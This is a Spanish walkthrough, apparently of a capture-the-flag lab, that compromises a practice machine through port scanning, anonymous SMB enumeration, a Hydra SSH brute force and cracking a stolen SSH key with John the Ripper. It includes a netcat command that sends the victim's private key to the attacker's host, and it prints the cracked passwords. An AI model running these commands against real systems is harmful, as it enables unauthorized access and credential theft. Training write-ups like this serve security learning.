# Basic Pentesting

## Escaneo de puertos

Usamos`nmap`para visualizar los servicios expuestos en la máquina.

```
sudo nmap -sC -sV 10.10.85.200
```

![[Pasted image 20250222181007.png]]

Encontramos los puertos 22, 80, 139, 445 abiertos.

## Inspeccionando el sitio web

Accedemos al sitio web por la IP.

![[Pasted image 20250222181820.png]]

No hay gran cosa pero usamos`dirbuster`para buscar más directorios ocultos.

![[Pasted image 20250222182004.png]]

Encontramos el directorio`/development/`y accedemos a él.

![[Pasted image 20250222182125.png]]

```
http://10.10.85.200/development/
```

![[Pasted image 20250222182148.png]]

Descargamos los ficheros del directorio con los siguientes comandos:

```
wget http://10.10.85.200/development/dev.txt   
wget http://10.10.85.200/development/j.txt
```

![[Pasted image 20250222182339.png]]

Este es el contenido de los archivos:

![[Pasted image 20250222182426.png]]

Llegamos a la conclusión de que el developer J tiene una contraseña débil y que puede ser crackeada.

## Enumerando el servicio SMB

Tenemos que buscar el nombre del developer "J". Enumeramos los sharename del servicio SMB activo.

```
smbclient -L //10.10.85.200 -N 
```

Podemos aprovecharnos del`Anonymous`.

![[Pasted image 20250222182811.png]]

```
smbclient //10.10.85.200/Anonymous -N 
```

![[Pasted image 20250222182931.png]]

Vemos que hay un archivo llamado`staff.txt`. Nos lo descargamos para visualizarlo.

![[Pasted image 20250222183040.png]]

El nombre de J era `Jan`y el de K era`Kay`.

## Ataque de fuerza bruta con Hydra

Vamos a hacer un ataque de fuerza por SSH al usuario`Jan`usando el diccionario rockyou.

```
sudo hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.85.200 ssh
```

Después de un tiempo, obtenemos la contraseña de`jan`, que es`armando`.

![[Pasted image 20250222184127.png]]

## Escalada de privilegios

Accedemos por SSH con las credenciales obtenidas:

```
ssh jan@10.10.85.200
```

![[Pasted image 20250222184243.png]]

Nos ubicamos en la carpeta home de`Kay`y descubrimos que podemos acceder a los pares de claves privadas.

![[Pasted image 20250222184436.png]]

Levantamos un netcat en escucha por el puerto 4040 en Kali:

```
nc -nlp 4040 > id_rsa
```

Y en la víctima lo enviamos con el siguiente comando:

```
nc 10.8.3.33 4040 < id_rsa
```

Ahora que tenemos la clave descargada la vamos a usar con John the Ripper para crackear la contraseña de`Kay`.

Modificamos el formato del archivo de`id_rsa`para que sea compatible con JTR.

```
sudo python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
```

Ejecutamos el ataque con`John the Ripper`.

```
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

La passphrase de la clave de`Kay`es`beeswax`.

![[Pasted image 20250222185856.png]]

Accedemos entonces por SSH con el usuario`Kay` y ponemos el passphrase de la clave.

```
sudo ssh -i id_rsa kay@10.10.85.200
```

![[Pasted image 20250222190834.png]]

Finalmente, encontramos la contraseña.

![[Pasted image 20250222190929.png]]

```
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```






































